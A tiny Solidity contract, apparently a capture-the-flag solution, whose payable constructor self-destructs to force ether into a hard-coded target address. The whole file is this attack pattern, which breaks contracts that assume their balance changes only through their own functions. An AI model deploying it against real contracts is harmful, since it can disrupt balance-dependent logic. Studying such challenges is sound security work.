contract ForceAttacker{
    constructor () payable{
        selfdestruct(payable(0x9f8BFA412c7F1a92b373A9fcb94F78D1d83d21E0));
    }
}